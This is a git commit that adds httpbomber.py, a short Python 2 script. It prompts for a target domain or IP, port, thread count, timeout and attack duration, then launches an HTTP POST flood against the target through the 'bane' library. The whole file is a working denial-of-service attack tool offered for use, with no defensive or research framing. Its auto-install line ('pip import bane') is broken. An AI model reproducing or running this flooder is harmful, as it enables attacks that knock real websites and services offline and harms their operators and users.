ec38394b8b8ca2477e53a383023edf050b916f27
AlaBouali <trap.leader.123@gmail.com>
2019-10-26 01:11:31 +0100

    Add files via upload

---
+++ httpbomber.py
@@ -0,0 +1,47 @@
+import os,sys
+try:
+ import bane
+except:
+ print"Failed to import a module.\nLet me install it for you.. (if you are using linux you have to execute it as root to install the required module)"
+ if os.path.isdir('/home')==True:
+  os.system('sudo pip import bane')
+ else:
+  os.system('pip import bane')
+import socket
+n=0
+while(n<1):
+ try:
+  u=raw_input('\nTarget Domain/IP: (www.google.com)\n> ')
+  socket.gethostbyname(u)
+  n+=1
+ except:
+  pass
+while(n<2):
+ try:
+  p=input('Port:\n>')
+  n+=1
+ except:
+  pass
+while(n<3):
+ try:
+  th=input('Threads:\n>')
+  n+=1
+ except:
+  pass
+while(n<4):
+ try:
+  ti=input('Timeout:\n>')
+  n+=1
+ except:
+  pass
+while(n<5):
+ try:
+  d=input('Attack\'s duration (in seconds):\n>')
+  n+=1
+ except:
+  pass
+try:
+ bane.httpflood(u,p=p,maxtime=ti,threads=th,interval=d,level=2,post_max=1000,post_min=500)
+except KeyboardInterrupt:
+ bane.ddos.stop=True
+
